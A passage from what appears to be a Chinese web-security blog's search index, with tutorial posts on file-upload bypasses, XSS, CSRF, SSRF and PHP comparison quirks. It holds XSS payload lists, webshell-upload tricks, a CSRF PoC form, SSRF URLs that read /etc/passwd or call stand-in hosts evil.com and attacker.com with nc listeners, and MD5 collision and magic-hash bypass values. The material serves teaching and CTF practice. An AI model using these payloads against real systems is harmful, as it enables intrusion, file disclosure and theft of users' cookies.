$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];                      if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;     \n\n绕过思路：抓包将content-type改为可接受图片形式，即可绕过\n文件头类型检测\n上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型\n\nif(file_exists($filename))&#123;       $info = getimagesize($filename);\n\n\n文件头就是文件特定的标志，如二进制PE文件的4D5A，bmp文件的424D，zip文件的504B0304，各种常见文件的文件头类型大家可以查找了解一下，常见图片文件头如下：\n\n\ngif: GIF89a\njpg,jpeg: FF D8 FF E0 00 10 4A 46 49 46\npng: 89 50 4E 47 0D 0A\n\n绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过\n文件扩展名检测\n这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。\n\n黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用\n\n基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。\n\n白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。\n\n00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。\n\n.htaccess\nhtaccess文件是apache服务器的一个配置文件，它负责相关目录下的网页配置\n\n\n通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能\n\n&lt;FilesMatch &quot;\\.jpg&quot;&gt;  SetHandler application/x-httpd-php &lt;/FilesMatch&gt;\n\n\n其中，SetHandler application/x-httpd-php意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行，不符合规则则报错\n\n文件上传之条件竞争​        \n","categories":["网络安全"],"tags":["web安全"]},{"title":"XSS","url":"/post/fe1aa8c3.html","content":"\n\nXSS攻击概述\n跨站脚本攻击XSS(Cross Site Scripting)恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页面时，嵌入 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。XSS 攻击针对的是用户层面的攻击！\n\nXSS攻击原理\nHTML 是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是 HTML 标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了 HTML 标签，当这些 HTML 标签引入了一段 JavaScript 脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生 XSS 漏洞。\n\n所有标签的 &gt; 都可以用 // 代替， 例如 &lt;script&gt;alert(1)&lt;/script//\n\n\nXSS攻击载荷\nscript标签\n\n\n &lt;script&gt;标签是最直接XSS，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中\n\n&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(/hack/)&lt;/script&gt;   #弹出hack&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss\n\n\nsvg标签\n\n&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;svg onload=&quot;alert(1)&quot;//\n\n\nimg标签\n\n&lt;img src=1 onerror=alert(&quot;hack&quot;)&gt;&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie\n\n\nbody标签\n\n&lt;body οnlοad=alert(1)&gt;&lt;body οnpageshοw=alert(1)&gt;\n\n\nvideo标签\n\n&lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;\n\n\nstyle标签\n\n&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;\n\nXSS可以插在哪里\n用户输入作为script标签内容\n用户输入作为HTML注释内容\n用户输入作为HTML标签的属性名\n用户输入作为HTML标签的属性值\n用户输入作为HTML标签的名字\n直接插入到CSS里\n最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里\n\n#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过&lt;!-- 用户输入 --&gt;&lt;!-- --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-- --&gt;#用户输入作为标签属性名，导致攻击者可以进行闭合绕过&lt;div 用户输入=&quot;xx&quot;&gt;  &lt;/div&gt;&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt; &lt;/div&gt;#用户输入作为标签属性值，导致攻击者可以进行闭合绕过&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;#用户输入作为标签名，导致攻击者可以进行闭合绕过&lt;用户输入  id=&quot;xx&quot; /&gt;&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;#用户输入作为CSS内容，导致攻击者可以进行闭合绕过&lt;style&gt;用户输入&lt;style&gt;&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;\n\nXSS攻击的分类\nXSS分为：存储型、反射型、DOM型\n\n\n存储型XSS：持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将存储到服务器中，用户访问该页面的时候出发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie\n反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在web页面。反射型XSS大多数是用来盗取用户的Cookie信息\nDOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型（DOM）的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射性XSS\n\nXSS的简单过滤和绕过区分大小写过滤标签//前端 1.html：&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;反射型XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action4.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;//后端 action4.php：&lt;?php$name=$_POST[&quot;name&quot;]; if($name!=null)&#123;\t$name=preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);      //过滤&lt;script&gt;\t$name=preg_replace(&quot;/&lt;\\/script&gt;/&quot;,&quot;&quot;,$name);   //过滤&lt;/script&gt;\techo $name; &#125;?&gt;\n\n 绕过技巧：可以使用大小写绕过  &lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;\n不区分大小写过滤标签$name=preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 &lt;script&gt;$name=preg_replace(&quot;/&lt;\\/script&gt;/i&quot;,&quot;&quot;,$name);  //不区分大小写过滤 &lt;/script&gt;\n\n绕过技巧：可以使用嵌套的script标签绕过&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;\n不区分大小写，过滤之间的所有内容$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了&lt;script  及其之间的所有内容\n\n虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。\npayload： &lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;\n","categories":["网络安全"],"tags":["web安全"]},{"title":"CSRF&SSRF","url":"/post/5905ffd4.html","content":"\n\nCSRFCSRF跨站请求伪造CSRF解释\nCSRF（Cross-site Request Forgery，跨站请求伪造）是一种针对网站的恶意利用。CSRF攻击可以利用用户已经登陆或已经授权的状态，伪造合法用户发出请求给受信任的网点，从而实现在未授权的情况下执行一些特权操作。\n\nCSRF攻击流程\n用户浏览器登录站点A\n登陆成功后，服务器向用户浏览器发送cookie\n用户在没有登出网站A的情况下，访问攻击者B\n攻击者B要求访问站点A，发出一个请求Request\n根据在（4）中的要求，浏览器带着（2）步的cookie访问站点A\n\nCSRF分类\nCSRF(GET)型\nget型主要是通过URL恶意链接诱导用户点击，当用户处于访问网站的过程中，同时用户又点击了这个链接，那么就会触发修改。比如当用户正在修改密码，比如修改的URL:/user.php?id=1&amp;password=11111，意思就是用户把密码修改为1111，若攻击者把URL修改为URL:/user.php?id=1&amp;password=123456789，然后通过社工手段进行诱导点击我们修改后的链接，那么当用户访问这个链接后就会把密码修改为123456789。\n\nCSRF(POST)型同样是修改密码但是这次在URL中不会显示密码，而且是在post中，那么当攻击者对该网站进行抓包分析整个数据包的构造，然后把相关的内容修改为其他用户的相关参数，然后同样是诱导用户去点击我们精心准备的WEB界面，那么当点击的时候就会自动进行提交，使其密码再次修改。例如pikachu上构建的数据内容：\n\n\n&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;    &lt;form action=&quot;http://192.168.10.150/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;116266565656&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;nba&amp;#32;lakes&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;kobe&amp;#64;pikachu&amp;#46;com&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;\n\nSSRFSSRF是什么\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。\n一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\nSSRF漏洞原理\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器\n\n产生SSRF漏洞的函数file_get_contents()\n下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。\n\n&lt;?php\tif (isset($_POST[&#x27;url&#x27;])) \t&#123; \t\t$content = file_get_contents($_POST[&#x27;url&#x27;]); \t\t$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; \t\tfile_put_contents($filename, $content); \t\techo $_POST[&#x27;url&#x27;]; \t\t$img = &quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; \t&#125;     echo $img; ?&gt;\n\nfsockopen()\n以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。\n\n&lt;?php \tfunction GetFile($host,$port,$link) \t&#123; \t\t$fp = fsockopen($host, intval($port), $errno, errstr, 30); \t\tif (!$fp) &#123; \t\t\techo &quot;$errstr (error number $errno) \\n&quot;; \t\t&#125; else &#123; \t\t\t$out = &quot;GET $link HTTP/1.1\\r\\n&quot;; \t\t\t$out .= &quot;Host: $host\\r\\n&quot;; \t\t\t$out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; \t\t\t$out .= &quot;\\r\\n&quot;; \t\t\tfwrite($fp, $out); \t\t\t$contents=&#x27;&#x27;; \t\t\twhile (!feof($fp)) &#123; \t\t\t\t$contents.= fgets($fp, 1024);             &#125; \t\t\tfclose($fp); \t\t\treturn $contents; \t\t&#125; \t&#125;?&gt;\n\ncurl_exec()\ncURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。\n\n&lt;?php \tif (isset($_POST[&#x27;url&#x27;]))\t&#123;\t\t$link = $_POST[&#x27;url&#x27;];\t\t$curlobj = curl_init();\t\tcurl_setopt($curlobj, CURLOPT_POST, 0);\t\tcurl_setopt($curlobj,CURLOPT_URL,$link);\t\tcurl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);\t\t$result=curl_exec($curlobj);\t\tcurl_close($curlobj);\t\t$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;\t\tfile_put_contents($filename, $result); \t\techo $result;\t&#125;?&gt;\n\n注意事项\n一般情况下PHP不会开启fopen的gopher wrapperfile_get_contents的gopher协议不能URL编码file_get_contents关于Gopher的302跳转会出现bug，导致利用失败curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用curl_exec() 默认不跟踪跳转，file_get_contents() file_get_contents支持php://input协议\n\nSSRF在URL的伪协议\n当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议\n\nfile:/// 从文件系统中获取文件内容，如，file:///etc/passwddict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：sftp:// SSH文件传输协议或安全文件传输协议ldap:// 轻量级目录访问协议tftp:// 简单文件传输协议gopher:// 分布式文档传递服务，可使用gopherus生成payload\n\nfile\n可以尝试从文件系统中获取文件：\n\n\nhttp://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini\n\ndict\n能够引用允许通过DICT协议使用的定义或单词列表：\n\n\nhttp://example.com/ssrf.php?dict://evil.com:1337/evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*]accepted (family 2, sport 31126)CLIENT libcurl 7.40.0\n\nsftp\n在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。\n\n\nhttp://example.com/ssrf.php?url=sftp://evil.com:1337/evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*]accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2\n\nldap://或ldaps://或ldapi://\nLDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。\n\n\nhttp://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit\n\ntftp://\nTFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。\n\n\nhttp://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKETevil.com:# nc -lvup 1337Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3\n\ngopher://\nGopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。\n\n\nhttp://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);?&gt;evil.com:# nc -lvp 1337Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest\n\nSSRF绕过方式@符号绕过\n在某地址1后添加@再次添加地址2，浏览器会自动返回地址2数据\n\n\nhttp://www.xxx.com@www.kxsy.work/\n\nIP地址转换\n对内网请求的IP地址进行各进制的编码\n\n\n例如：127.0.0.1二进制 = 1111111000000000000000000000001十六进制 = 7F000001十进制 = 2130706433\n\n转换短地址\nhttps://www.985.so/ 例：http://www.kxsy.work/ = http://u6.gg/ks69x\n\n特殊符号替换绕过\n例：http://www.kxsy.work/ = http://www。kxsy。work/ localhost或者0.0.0.0\n\n利用句号绕过\nhttp://baidu.com/?url=http://192。168。10。150\n\n添加端口绕过\nhttp://baidu.com/?url=http://google.com:443\n\n利用[::]绕过\nhttp://baidu.com/?url=http://[::192.168.10.150]\n\n302跳转绕过&lt;?php  $schema = $_GET[&#x27;s&#x27;];$ip     = $_GET[&#x27;i&#x27;];$port   = $_GET[&#x27;p&#x27;];$query  = $_GET[&#x27;q&#x27;];if(empty($port))&#123;      header(&quot;Location: $schema://$ip/$query&quot;); &#125; else &#123;    header(&quot;Location: $schema://$ip:$port/$query&quot;); &#125;\n\nxip.io绕过：会将解析到子域http://10.0.0.1.xip.io = 10.0.0.1www.10.0.0.1.xip.io= 10.0.0.1http://mysite.10.0.0.1.xip.io = 10.0.0.1foo.http://bar.10.0.0.1.xip.io = 10.0.0.110.0.0.1.xip.name resolves to 10.0.0.1www.10.0.0.2.xip.name resolves to 10.0.0.2foo.10.0.0.3.xip.name resolves to 10.0.0.3bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4\n","categories":["网络安全"],"tags":["web安全"]},{"title":"PHP特性","url":"/post/44659fec.html","content":"\n\n正则表达式元字符\n\n\n符号\n描述\n\n\n\n\\d\n匹配任意一个十进制数字，等价于[0-9]\n\n\n\\D\n匹配任意一个除十进制数字以外的字符，等价于[^0-9]\n\n\n\\s\n匹配任意一个空白字符，等价于[\\f\\n\\r\\t\\v]\n\n\n\\S\n匹配除空白字符以外任何一个字符，等价于[^\\f\\n\\r\\t\\v]\n\n\n\\w\n匹配任意一个数字、字母或下划线，等价于[0-9a-zA-Z]\n\n\n\\W\n匹配除数字、字母或下划线以外的任意一个字符，等价于[^0-9a-zA-Z]\n\n\n*\n匹配0次、1次或多次其前面的原子\n\n\n+\n匹配1次或多次其前面的原子\n\n\n?\n匹配0次或1次其前面的原子\n\n\n.\n匹配除了换行符外的任意一个字符\n\n\n|\n匹配两个或多个分支选择\n\n\n{n}\n表示其前面的原子恰好出现n次\n\n\n{n,}\n表示其前面的原子出现不少于n次\n\n\n{n,m}\n表示其前面的原子至少出现n次，最多出现m次\n\n\n^或\\A\n匹配输入字符串的开始位置（或在多行模式下的开头，即紧随一换行符之后）\n\n\n$或\\Z\n匹配输入字符串的结束位置（或在多行模式下的结尾，即紧随一换行符之前）\n\n\n\\b\n匹配单词的边界\n\n\n\\B\n匹配出单词边界以外的部分\n\n\n[]\n匹配方括号中指定的任意一个原子\n\n\n[^]\n匹配出方括号中的原子以外的任意一个字符\n\n\n()\n匹配其政体为一个原子，即模式单元，可以理解为由多个单个原子组成的大原子\n\n\n模式修正符\n\n\n符号\n描述\n\n\n\ni\n在和模式进行匹配时不区分大小写\n\n\nm\n将字符串视为多行，默认的正则开始”^”和结束”$”将目标字符串作为单一的一 “行” 字符（甚至其中包含有换行符也是如此）；如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行，每一行的开头就是”^”，结尾就是”$”\n\n\ns\n如果设定了此字符，模式中的圆点元字符”.”匹配所有的字符，包括换行符,即将字符串视为单行，换行符作为普通字符看待\n\n\nx\n模式中的空白忽略不计，除非它已经被转义\n\n\ne\n只用在pre_replace()函数中，在替换字符串中对逆向引用做正常的替换，将其作为PHP代码求值，并用其结果来替换所搜索的字符串\n\n\nU\n贪婪模式，最大限度匹配\n\n\nD\n模式中的”$”仅匹配目标字符串的结尾，没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前；如果设定了m修正字符则忽略此选项\n\n\n贪婪匹配与惰性匹配\n贪婪匹配：匹配尽可能多的字符\n惰性匹配：匹配尽可能少的字符\n“?”：如果紧跟在任何量词*、+、?或{}的后面，会使量词编程惰性，例如对”123abc”使用/\\d+/将会匹配”123”，而使用/\\d+?/只会匹配到”1”\n\n\n\n\n函数符\n描述\n\n\n\n*?\n零次或多次，但尽可能少的匹配\n\n\n+?\n一次或多次，但尽可能少的匹配\n\n\n??\n0次或1次，但尽可能少的匹配\n\n\n{n,}?\n至少n次，但尽可能少的匹配\n\n\n{n,m}?\nn到m次 ，但尽可能少的匹配\n\n\n函数preg_match()数组绕过\npreg_match()只能处理字符串，当传入的subject是数组时会返回false\n\nif(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;\n\npayload: num[]=1\n换行绕过if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;\n\npayload: cmd=%0aphp\n最大回溯次数绕过\nPHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。\n\nintval()\n获取变量的整数值\n\n成功时返回 var 的 integer 值，失败时返回 0，空的 array 返回 0，非空的 array 返回 1\n\n\n&lt;?phpecho intval(42);                      // 42echo intval(4.2);                     // 4echo intval(&#x27;42&#x27;);                    // 42echo intval(&#x27;+42&#x27;);                   // 42echo intval(&#x27;-42&#x27;);                   // -42echo intval(042);                     // 34echo intval(&#x27;042&#x27;);                   // 42echo intval(1e10);                    // 1410065408echo intval(&#x27;1e10&#x27;);                  // 1echo intval(0x1A);                    // 26echo intval(42000000);                // 42000000echo intval(420000000000000000000);   // 0echo intval(&#x27;420000000000000000000&#x27;); // 2147483647echo intval(42, 8);                   // 42echo intval(&#x27;42&#x27;, 8);                 // 34echo intval(array());                 // 0echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1echo intval(false);                   // 0echo intval(true);                    // 1?&gt;\n\n字符绕过\nintval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。\n\nif($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;\n\npayload: num=4476a\n科学计数法\nintval()函数如果base为0，则var中存在字母的话遇到字母就停止读取，但是e这个字母比较特殊，可以在PHP中表示科学计数法。\n\nif($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;\n\npayload: num=4476e1\n进制转换\n0b?? : 二进制0??? : 八进制0X?? : 十六进制\n\nif($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;\n\npayload: num=010574\n小数点绕过if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;\n\npayload: num=4476.0\nstrpos()strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）\n\n\n利用+代替空格绕过\n\nmd5\nmd5绕过\n\n弱比较\n只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等\n\n在这样的弱比较里，0e开头的会被识别成科学计数法，结果均为0，比较时0=0为true绕过\n\n\n240610708:0e462097431906509019562988736854QLTHNDT:0e405967825401955372549139051580QNKCDZO:0e830400451993494058024219903391PJNPDWY:0e291529052894702774557631701704NWWKITQ:0e763082070976038347657360817689NOOPCJF:0e818888003657176127862245791911MMHUWUV:0e701732711630150438129209816536MAUXXQC:0e478478466848439040434801845361\n\n强比较\n数组绕过\n如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为true绕过\n\nmd5碰撞if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;])===md5($_GET[&#x27;b&#x27;]))&#123;\techo $flag;&#125;\n\n真实md5碰撞，因为此时不能输入数组了，只能输入字符串\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n\nin_array()\n搜索数组中是否存在指定的值。\n\n没有设置第三个参数时就可以形成自动转换\n\neg:x=1.php自动转换为1\n\n\nphp弱比较var_dump()\n显示变量相关信息\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行\n如果该字符串以合法的数值开始，则使用该数值，否则其值为0。\n\n\n\n字符串和数字比较var_dump(&#x27;a&#x27; == 0);\t//bool(true)var_dump(&#x27;1a&#x27; == 1);\t//bool(true)var_dump(&#x27;12a&#x27; == 1);\t//bool(false)\n\n\n会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成false，false又和0弱类型比较是相等的，所以第一个是true。\n但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。\n\n布尔true和任意比较var_dump(True == 0);\t//bool(false)var_dump(True == &#x27;False&#x27;);\t//bool(true)var_dump(True == 2);\t//bool(true)\n\n\nbool 1和任何比较都相等，除了0和false，因为0也认为是bool false，true是不等于false的，所以第一条是false，其余的全是true。\n\nhash值和字符串“0”比较\nhash: 哈希算法\n特点：\n对于特定的hash算法输出结果的长度总是一定的；\n对于相同的输入内容不管执行多少次hash函数，总会得到相同的hash值；\n对于输入字符串哪怕及其微小的变动也会引起输出结果巨大的变化\n哈希过程是单向的，即不能通过特定的函数从hash值恢复出原始数据。\n\n\n常见的hash算法: MD5、SHA1、SHA224、SHA256、SHA512等\n\n$str1 = &quot;a&quot;;echo md5($str1);\t//0cc175b9c0f1b6a831c399e269772661var_dump(md5($str1) == &#x27;0&#x27;);\t//bool(false)---------------------------------------------------------$str2 = &quot;s224534898e&quot;;echo md5($str2);\t//0e420233178946742799316739797882var_dump(md5($str2) == &#x27;0&#x27;);\t//bool(true)---------------------------------------------------------$str3 = &#x27;a1b2edaced&#x27;;echo md5($str3);\t//0e45ea817f33691a3dd1f46af81166c4boolvar_dump(md5($str3) == &#x27;0&#x27;);\t//bool(false)---------------------------------------------------------var_dump(&#x27;0e111111111111&#x27; == &#x27;0&#x27;);\t//bool(true) \n\n\n只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。\n所以当hash出来的32个值，开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的。\n第一条只是0开头，所以只能当普通字符串，结果为false。\n第二条0e后面全为数字，符合要求，结果为true。\n第三条虽然为0e，但是后面不全为数字，所以结果为false。\n\n优先级符号\n&amp;&amp;与||的优先级高于=\n=的优先级高于and与or\n\n$bA = true;$bB = false;$b1 = $bA and $bB;$b2 = $bA &amp;&amp; $bB;var_dump($b1); // $b1 = truevar_dump($b2); // $b2 = false$bA = false;$bB = true;$b3 = $bA or $bB;$b4 = $bA || $bB;var_dump($b3); // $b3 = falsevar_dump($b4); // $b4 = true\n\nget 